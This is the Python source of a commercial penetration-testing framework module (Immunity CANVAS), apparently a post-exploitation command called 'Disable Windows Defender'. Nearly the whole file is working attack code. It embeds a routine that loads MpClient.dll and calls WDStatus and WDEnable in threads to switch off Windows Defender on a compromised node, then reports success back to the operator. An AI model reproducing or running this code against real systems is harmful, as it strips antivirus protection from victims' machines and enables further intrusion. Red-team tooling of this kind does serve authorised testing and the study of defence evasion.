#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2008
#http://www.immunityinc.com/CANVAS/ for more information

import sys
#covers both angles
if "." not in sys.path:
    sys.path.append(".")

import os,getopt
import socket
from exploitutils import *
import canvasengine
import time
from libs import canvasos

from canvasexploit import canvasexploit
from ExploitTypes.localcommand import LocalCommand

NAME                = "Disable Windows Defender"
DESCRIPTION         = "Weakness where the Windows Defender API allows you to zero out a flag that bypasses a code signing check. This allows unsigned code to disable Windows Defender."
VERSION             = "1.0"

DOCUMENTATION       = {}

PROPERTY            = {}
PROPERTY['TYPE']    = "Commands"
PROPERTY['SITE']    = "Local"
PROPERTY['ARCH']    = [ ["Windows"] ]
DOCUMENTATION['Notes'] = """
This technique no longer works on Windows 10 as the MpClient.dll!WDEnable call no longer returns true ever. 

^^ https://msdn.microsoft.com/en-us/library/windows/desktop/bb762466(v=vs.85).aspx
"""

class theexploit(LocalCommand):
    def __init__(self):
        LocalCommand.__init__(self)
        self.result         = ""
        self.name           = NAME
        self.defender_path  = "C:\\Program Files\\Windows Defender\\MpClient.dll"
        self.disable_func   = "WDEnable"
        self.check_func     = "WDStatus"
            
    def DisableWindowsDefenderCode( self, bitness=32 ):
        vars={}
        vars["WD_DLL"]      = self.defender_path
        vars["WD_Func"]     = self.disable_func
        vars["WD_Check"]    = self.check_func

        # NN: uhoh! kernel32|LoadLibraryA did not get translated into kernel32.dll|LoadLibraryA !
        # that sould have been handled in our find_function() patch but doesn't actually appear to be.
        
        disable_code = """
        #import "IMPORT_TYPE", "kernel32.dll|LoadLibraryA" as "LoadLibraryA"
        #import "IMPORT_TYPE", "kernel32.dll|GetProcAddress" as "GetProcAddressA"
        #import "IMPORT_TYPE", "kernel32.dll|CreateThread" as "CreateThread"
        #import "IMPORT_TYPE", "kernel32.dll|TerminateThread" as "TerminateThread"
        #import "IMPORT_TYPE", "kernel32.dll|CloseHandle" as "CloseHandle"
        #import "IMPORT_TYPE", "kernel32.dll|Sleep" as "Sleep"
        #import "IMPORT_TYPE", "kernel32.dll|FreeLibrary" as "FreeLibrary"

        #import "string", "WD_DLL" as "WD_DLL"
        #import "string", "WD_Func" as "WD_Func"
        #import "string", "WD_Check" as "WD_Check"
        
        #import "local", "sendint" as "sendint"
        
        void main()
        {
          POINTER_TYPE hDll;
          POINTER_TYPE disableFunc;
          int result;
          int disableCode;
          unsigned int checkResult;
          POINTER_TYPE checkFunc;

          
        
          checkResult = 2;
          hDll = LoadLibraryA(WD_DLL);
          disableCode = 0;

          
          if(hDll)
          { 
            disableFunc = GETPROCADDRESS_NAME(hDll, WD_Func);
            checkFunc   = GETPROCADDRESS_NAME(hDll, WD_Check );
            result = CreateThread( 0, 0, checkFunc, &checkResult, 0, 0 );
            
            // Buy our thread a little time
            Sleep(2000);

            
            
            if( checkResult )
            {
              // Its turned on, so flip it off! Kill the original thread first
              // Close the thread handle too
              TerminateThread( result, &checkResult );
              CloseHandle( result );
              
              result = CreateThread( 0, 0, disableFunc, disableCode, 0, 0 );

              Sleep( 2000 );

              

              if( result )
              {
                TerminateThread( result, &checkResult );
                CloseHandle( result );
                
                // Now we can check again kill the previous thread first
                // Close the thread handle too
                result = CreateThread( 0, 0, checkFunc, &checkResult, 0 , 0 );
                
                Sleep(2000);
                
                if( checkResult )
                {
                  // It's still running so send back the flag :(
                  sendint(2);
                  TerminateThread( result, &checkResult );
                  CloseHandle( result );
                  FreeLibrary( hDll );
                  return;
                }else{
                
                  // Sweet we managed to turn it off
                  sendint(1);
                  TerminateThread( result, &checkResult );
                  CloseHandle( result );
                  FreeLibrary( hDll );
                  return;
                }
                
              }else{
                
                // Couldn't get a result back
                sendint(-1);
                FreeLibrary( hDll );
                return;
            }
               
                
            }else{
            
              // It's already turned off no need to do anything
              sendint( 3 );
              TerminateThread( result, &checkResult );
              CloseHandle( result );
              FreeLibrary( hDll );
              return;
            }
        }
        
        sendint(-1);
        FreeLibrary( hDll );
        return;
        }
            """.replace("IMPORT_TYPE", "remote" if bitness == 32 else "local").replace("POINTER_TYPE", "int" if bitness == 32 else "long long").replace("GETPROCADDRESS_NAME", "GetProcAddressA" if bitness == 32 else "GetProcAddress")

        return self.node.shell.runCode(disable_code, vars)

        
    def run(self):
        self.setInfo("%s (in progress)" % (NAME))

        node        = self.argsDict["passednodes"][0]
        self.result = []

        logging.info("Once we acquire all function addresses, we sleep. Wait for 10 seconds or so.....")
        
        for node in self.argsDict["passednodes"]:
            self.node       = node
            nodetype        = node.nodetype
            capabilities    = node.capabilities

            if self.is_windows_node():
                os_version_info = node.shell.os_version_info()

                if not any([os_version_info["major"] > 10,
                            all([os_version_info["major"] == 10,
                                 os_version_info["build"] >= 14393])]):
                    ret = None
                    bitness = 64 if nodetype.lower().startswith("win64") else 32
                    
                    ret = self.DisableWindowsDefenderCode(bitness)

                    logging.info("Return result: 0x%08x" % ret)
                    self.result += [ret]
                    if ret:
                        if ret == 3:
                            logging.info("Windows Defender was already disabled. Skipping.")
                        else:
                            logging.info("Successfully disabled Windows Defender. 0x%08x" % ret)
                    else:
                        logging.warning("Couldn't turn off Windows Defender, make sure you have Administrator privileges.")
                    
                else:
                    logging.warning("The MpClient.dll!WDEnable method does not work on Windows 10 1607 and above nodes")
                    logging.info("See module notes for details")
            else:
                logging.info("The node named %s of type %s does not have the capabilities needed to run this command"%(node.get_name(),nodetype))
                self.result += [0]
                
        if 1 in self.result:
            ret = 1
        else:
            ret = 0

        self.dispshellcmd = self.command
        self.setInfo("%s - (finished)" % (NAME))
        return ret

